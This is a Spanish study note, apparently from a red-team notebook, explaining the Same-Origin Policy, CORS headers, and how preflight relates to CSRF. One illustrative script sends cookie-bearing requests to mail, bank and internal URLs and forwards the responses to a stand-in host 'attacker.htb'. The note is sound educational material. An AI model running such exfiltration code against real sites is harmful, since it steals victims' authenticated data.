---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - CORS
  - CSRF
Descripción: "Entender las defensas CSRF y cómo sortearlas exige dominar antes la Same-Origin Policy y CORS. La primera es la barrera que aísla orígenes en el navegador; el segundo, el…"
Fecha de actualización: 2026-06-08
Nota previa: "[[01 - Fundamentos y defensas de CSRF]]"
Nota siguiente: "[[03 - CORS Misconfigurations]]"
Area: "[[CSRF.base|CSRF]]"
---
---

Entender las defensas CSRF y cómo sortearlas exige dominar antes la `Same-Origin Policy` y `CORS`. La primera es la barrera que aísla orígenes en el navegador; el segundo, el mecanismo que define excepciones a esa barrera — y la fuente de las *misconfigurations* más explotables.

# Same-Origin Policy

<mark style="background: #ADCCFFA6;">La `Same-Origin Policy` (SOP) impide que el JavaScript de un origen acceda a recursos de un origen distinto</mark>. Sin ella, cualquier web que visitaras podría leer tu correo o tu banca online aprovechando tu sesión.

## Qué es un origin

El `origin` (definido en [RFC 6454](https://datatracker.ietf.org/doc/html/rfc6454)) se compone de **scheme + host + port**. Dos URLs tienen el mismo origen solo si coinciden las tres propiedades:

| URL A | URL B | ¿Mismo origen? | Motivo |
| - | - | - | - |
| `https://htb.com` | `http://htb.com` | No | Distinto scheme |
| `https://academy.htb.com` | `https://htb.com` | No | Distinto host |
| `https://htb.com` | `https://htb.com:8443` | No | Distinto puerto |
| `https://htb.com` | `https://htb.com:443` | Sí | 443 es el puerto por defecto de HTTPS |

## Por qué existe: el escenario sin SOP

Imagina que la SOP no existiera y visitaras `https://exploitserver.htb`, que ejecuta:

```html
<script>
    async function exfil(url) {
        const r = await fetch(url, {credentials: "include"});
        await fetch("https://attacker.htb/?c=" + btoa(await r.text()));
    }
    exfil("https://mymails.htb/getmails");
    exfil("https://mybank.htb/myaccounts");
    exfil("https://192.168.1.5/");   // servicio interno de tu red
</script>
```

<mark style="background: #FFB86CA6;">Cada `fetch` viajaría con tus cookies, leería la respuesta autenticada y la enviaría al atacante</mark>: tu correo, tu banca, incluso un servicio interno que solo es accesible desde tu red local. La SOP existe precisamente para que esto **no** ocurra.

## Qué bloquea y qué no

Un matiz crítico para la explotación: <mark style="background: #FF5582A6;">la SOP bloquea **leer la respuesta** cross-origin, pero la petición se envía igualmente</mark> —con las cookies incluidas—. El navegador lanza la petición, el servidor la procesa, y solo entonces el navegador impide que el JavaScript lea la respuesta:

```text
Access to fetch at 'https://mymails.htb/getmails' from origin 'https://exploitserver.htb'
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present.
```

> [!important]+ Enviar ≠ leer: la raíz del CSRF
> Que la petición **se envíe** (autenticada) aunque no se pueda **leer** la respuesta es exactamente lo que habilita el CSRF: para cambiar estado (`/promote`) no necesitas la respuesta, solo que la petición llegue con la sesión de la víctima. La SOP no detiene un CSRF clásico; lo detienen `SameSite` y los tokens.

Además, la SOP tiene **excepciones por diseño**: las etiquetas `img`, `video`, `script` y `link` pueden cargar recursos cross-origin (por eso puedes incrustar una imagen de otro dominio). Esta exención de `<script>` habilita `JSONP` y los ataques `XSSI` (leer datos cross-origin servidos como JS); en CSP, un endpoint JSONP dentro de una allowlist de `script-src` se convierte en gadget de bypass, como veremos en el [[05 - Bypass de CSP|nivel avanzado]].

# CORS

<mark style="background: #ADCCFFA6;">`Cross-Origin Resource Sharing` (CORS) es el estándar W3C que define excepciones controladas a la SOP</mark>: permite a un servidor declarar qué orígenes y métodos pueden acceder a sus respuestas cross-origin.

## Por qué se necesita

El patrón es ubicuo: una front-end en `https://app.htb` que consume una API en `https://api.app.htb`. Distinto host = distinto origen = la SOP bloquea el `fetch` de la front-end a su propia API. CORS es lo que permite que se comuniquen sin error.

## Las cabeceras CORS

El servidor configura las excepciones con cabeceras en la **respuesta**:

| Cabecera | Función |
| - | - |
| `Access-Control-Allow-Origin` | Origen al que se concede la excepción (o `*`) |
| `Access-Control-Allow-Methods` | Métodos permitidos (respuesta a preflight) |
| `Access-Control-Allow-Headers` | Cabeceras permitidas (respuesta a preflight) |
| `Access-Control-Allow-Credentials` | Si es `true`, permite la excepción **con credenciales** (cookies) |
| `Access-Control-Expose-Headers` | Cabeceras de respuesta que el JS puede leer |
| `Access-Control-Max-Age` | Cuánto se cachea el preflight |

<mark style="background: #FFB86CA6;">`Access-Control-Allow-Credentials: true` es la cabecera que decide si una respuesta autenticada es legible cross-origin</mark> — y, por tanto, la que convierte una mala configuración en una fuga de datos de la sesión de la víctima.

## Simple requests vs preflight

Una **`simple request`** no dispara comprobación previa. Lo es si: método `GET`/`HEAD`, o `POST` con `Content-Type` de `application/x-www-form-urlencoded`, `multipart/form-data` o `text/plain`, y sin cabeceras custom. El navegador la envía directamente y aplica CORS solo al leer la respuesta.

Cualquier otra petición (`PUT`, `DELETE`, `Content-Type: application/json`, cabeceras custom) es **`preflighted`**: el navegador envía primero una petición `OPTIONS` preguntando permiso, y solo manda la real si el servidor responde con las cabeceras CORS adecuadas:

```http
OPTIONS /data HTTP/1.1
Host: api.app.htb
Origin: https://app.htb
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
```

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.htb
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: content-type
```

Solo tras esa respuesta favorable el navegador envía el `POST` real.

> [!important]+ El preflight mata el CSRF, pero no el CORS mal configurado
> <mark style="background: #8000E1A6;">Una petición *preflighted* no puede ser CSRF</mark>: el navegador pide permiso antes de enviarla, así que el atacante no puede forzar una petición `application/json` cross-site a ciegas. Pero esto no protege contra un servidor con CORS **mal configurado**, que es lo que explotamos en [[03 - CORS Misconfigurations]].

> [!info]+ Fuentes de referencia
> - [MDN — CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS) y [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
> - [PortSwigger — CORS](https://portswigger.net/web-security/cors)
> - [RFC 6454 — The Web Origin Concept](https://datatracker.ietf.org/doc/html/rfc6454)
